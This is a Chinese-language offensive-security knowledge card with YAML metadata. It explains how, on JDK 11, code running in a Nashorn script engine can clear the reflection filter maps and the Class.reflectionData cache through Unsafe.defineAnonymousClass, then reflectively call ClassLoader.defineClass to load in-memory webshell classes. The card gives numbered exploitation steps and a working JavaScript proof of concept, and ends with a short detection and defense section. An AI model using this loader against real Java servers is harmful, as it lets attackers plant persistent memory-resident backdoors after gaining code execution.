---
id: web-java-classloader-jdk11-reflection-filter-unsafe-defineclass-bypass
title: JDK 11 脚本环境加载任意类：Unsafe.defineAnonymousClass 清空 Reflection.fieldFilterMap/methodFilterMap 并刷新 Class.reflectionData 后反射 defineClass
type: scenario
domain: web
path: web/java/classloader
technique: jdk11-reflection-filter-clear-unsafe-defineclass
aliases:
- JDK11 反射过滤绕过
- Reflection.fieldFilterMap 清空
- methodFilterMap 置空
- Class.reflectionData 缓存清理
- defineAnonymousClass 反射绕过
- Nashorn 加载内存马类
tags:
- java
- jdk11
- reflection
- unsafe
- defineanonymousclass
- reflectiondata
- classloader
- memshell
- nashorn
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-13'
updated: '2026-11-13'
affected_versions: JDK >= 11（原文 JS loader 对 11+ 走 bypassReflectionFilter 分支；11 以下走 Unsafe.defineClass 分支）
verification:
  verified_by: verifier-V676
  verified_at: '2026-11-13T12:05:43+08:00'
  notes: 已对照原文 JS loader 代码块（原文此处无截图）核对：version.split('.')[0]>=11 分支先 bypassReflectionFilter()，以 defineAnonymousClass(Reflection.class 自身字节/Class.class 字节) 借宿主访问权取 fieldFilterMap/methodFilterMap/reflectionData 私有字段，Unsafe.putObject 置空过滤表并把 Class.reflectionData 缓存置 null，再经 AccessibleObject.override=true（setAccessible 函数）后反射 ClassLoader.defineClass([B,int,int) 并 invoke；11 以下分支走 Unsafe.defineClass+ProtectionDomain，与原文一致。affected_versions JDK >= 11 对应原文该分支表达式，knowledge 缺该字段已用 set-versions 补齐（staging 同值）。dedup：与 JDK17 Class.module 伪装、module encapsulation Unsafe 卡版本/阻断点/手法不同；与 unsafe-anonymous-class-jsp-shell 卡为多步前置绕过 vs 直接执行，非同链。未验证点：未在本机复跑；JDK 15–16 可用性与 17 起移除 defineAnonymousClass 为外部知识，非原文。
---

## 一句话结论

在 JDK 9–16（尤其 JDK 11，原文实测环境）里，从脚本引擎（如 H2 INIT 的 `//javascript`）反射调用 `ClassLoader.defineClass` 加载内存马时，会被 `jdk.internal.reflect.Reflection` 的字段/方法过滤表挡住 `setAccessible`；可用 `Unsafe.defineAnonymousClass` 以 Reflection 与 Class 自身为宿主拿到私有静态字段，再用 `Unsafe.putObject` 把 `fieldFilterMap`/`methodFilterMap` 替换为空 HashMap、把 `Class.reflectionData` 缓存置空，即可恢复反射定义类的能力并 newInstance 恶意类。

## 原理

- **过滤表来源**：JDK 9+ 的 `jdk.internal.reflect.Reflection`（JDK 8 为 `sun.reflect.Reflection`）在静态初始化时登记 `fieldFilterMap`/`methodFilterMap`，限制对敏感类（`java.lang.Class`、`ClassLoader` 等）成员的 `setAccessible`；直接反射读这两个私有静态字段会被访问检查拒绝。
- **defineAnonymousClass 借权**：`Unsafe.defineAnonymousClass(hostClass, bytes, null)` 以宿主类（Reflection）的自身字节码定义匿名类，匿名类与宿主同包、同访问域，因此能 `getDeclaredField` 拿到 `fieldFilterMap`/`methodFilterMap` 的 Field 对象。
- **改写静态字段**：用匿名类拿到的 Field 求 `Unsafe.staticFieldOffset(field)`，再对**真实 Reflection 类**执行 `Unsafe.putObject(reflectionClass, offset, new HashMap())`，把过滤表替换为空表；因为 Unsafe 写入不受 Java 访问控制限制，静态字段被直接改写。
- **清 reflectionData 缓存**：`Class` 的反射数据存放在 `reflectionData` 软引用缓存中，旧缓存可能保留过滤结果；同样以 `Class.class` 为宿主定义匿名类，取 `reflectionData` 字段，`Unsafe.putObject(Class.class, objectFieldOffset(...), null)` 清空，后续反射会重建缓存。
- **完成 defineClass**：之后可继续用 Unsafe 把 `AccessibleObject.override` 置 true（绕过 setAccessible 检查），再 `ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class)` + `setAccessible(true)` + `invoke` 定义攻击者字节码并 newInstance；也可在清表后直接 setAccessible。
- **适用窗口**：原文在 JDK 11（Metabase 环境）实测成功并加载内存马；`Unsafe.defineAnonymousClass` 在 JDK 15 起弃用、JDK 17 起移除，Nashorn 在 JDK 15 起移除，因此该手法主要适用于仍带 Nashorn 的 JDK 8–14；JDK 17+ 需改用 `Class.module` 伪装等强封装绕过（见关联卡）。

## 触发条件

- 目标 JDK 9–14（有 Reflection 过滤表；Nashorn 可用），JDK 11 最常见。
- 已能在 JVM 内执行代码（H2 INIT JavaScript、表达式注入、反序列化、JSP 等），且 `sun.misc.Unsafe` 可访问、未被限制。
- 需要反射调用 `ClassLoader.defineClass` 或对 `java.lang` 内部成员 `setAccessible`。
- 未启用 JDK 17 级强封装或 RASP 拦截 `defineAnonymousClass`/Unsafe 写入。

## 利用步骤

1. 反射取 `sun.misc.Unsafe.theUnsafe` 得到 Unsafe 实例。
2. 按 JDK 版本选 Reflection 类：JDK9+ 为 `jdk.internal.reflect.Reflection`，JDK8 为 `sun.reflect.Reflection`。
3. `defineAnonymousClass(reflectionClass, 其自身 class 资源字节, null)`，从匿名类取 `fieldFilterMap`/`methodFilterMap` 字段。
4. 对真实 Reflection 类用 `staticFieldOffset` + `putObject` 写入空 HashMap，清空过滤表。
5. 同样方式取 `Class.reflectionData` 字段并 `putObject(Class.class, offset, null)` 清缓存。
6. 反射取 `ClassLoader.defineClass(byte[],int,int)`，`setAccessible(true)` 后 `invoke` 加载目标字节码，`newInstance()` 触发其静态块/构造逻辑。
7. 验证：加载一个打印类并调用；失败时核对 JDK 版本、Reflection 类名、字段名与偏移。

## PoC

```javascript
// Nashorn 环境下的核心步骤（最小化；原文 JS 中字节码走 Base64）
function getUnsafe(){
  var f = java.lang.Class.forName("sun.misc.Unsafe").getDeclaredField("theUnsafe");
  f.setAccessible(true); return f.get(null);
}
function load(bytes){
  var u = getUnsafe();
  var rc = java.lang.Class.forName("jdk.internal.reflect.Reflection");
  var anon = u.defineAnonymousClass(rc, rc.getResourceAsStream("Reflection.class").readAllBytes(), null);
  u.putObject(rc, u.staticFieldOffset(anon.getDeclaredField("fieldFilterMap")), new java.util.HashMap());
  u.putObject(rc, u.staticFieldOffset(anon.getDeclaredField("methodFilterMap")), new java.util.HashMap());
  var ca = u.defineAnonymousClass(java.lang.Class, java.lang.Class.getResourceAsStream("Class.class").readAllBytes(), null);
  u.putObject(java.lang.Class, u.objectFieldOffset(ca.getDeclaredField("reflectionData")), null);
  var m = java.lang.Class.forName("java.lang.ClassLoader").getDeclaredMethod("defineClass",
      java.lang.Class.forName("[B"), java.lang.Integer.TYPE, java.lang.Integer.TYPE);
  m.setAccessible(true);
  var cl = new java.net.URLClassLoader(java.lang.reflect.Array.newInstance(java.lang.Class.forName("java.net.URL"), 0));
  var c = m.invoke(cl, bytes, 0, bytes.length);
  return c.newInstance();
}
```

（原文在 JS 内以 Base64 字节码调用该逻辑；未在本机复跑。）

## 变体与关联

- [[web-java-classloader-unsafe-anonymous-class-jsp-shell]]：Unsafe.defineAnonymousClass 直接执行匿名类载荷，未处理反射过滤表。
- [[web-java-classloader-jdk17-class-module-field-spoof]]：JDK 17 强封装下改用 `Class.module` 伪造获得内部成员反射权限。
- [[web-java-component-jetty11-customizer-memshell-godzilla]] 与 [[web-java-component-metabase-cve-2023-38646-setup-token-h2-init-javascript-rce]]：本绕过作为其加载器前置的实际用例（H2 INIT JavaScript → 加载 Jetty 内存马）。
- [[web-java-rce-nashorn-bcel-jsp-webshell-av-bypass]]：Nashorn 脚本加载字节码的免杀形态。
- 变体：JDK8 改 `sun.reflect.Reflection`；JDK 17+ 走模块伪装或 `--add-opens`；无 Nashorn 的高版本需其他脚本入口或直接反序列化加载。
- 边界：Unsafe 被禁用、`defineAnonymousClass` 被移除（JDK17+）、RASP 监控反射写静态字段时不可用。

## 检测与防御

- 检测：运行期反射访问 `sun.misc.Unsafe`、`defineAnonymousClass`、`jdk.internal.reflect.Reflection`；对 `Reflection.fieldFilterMap`/`methodFilterMap` 的写操作；无磁盘来源的 `defineClass`；脚本引擎（Nashorn）内出现 `getResourceAsStream("Reflection.class")` 类字节读取。
- 防御：JDK 升级到 17+ 强封装并保持模块限制；限制 `sun.misc.Unsafe`（`--limit-modules`、RASP）；JDK 15+ 默认无 Nashorn；封堵 H2 INIT/表达式注入/反序列化等前置入口；监控动态类定义与敏感反射调用。
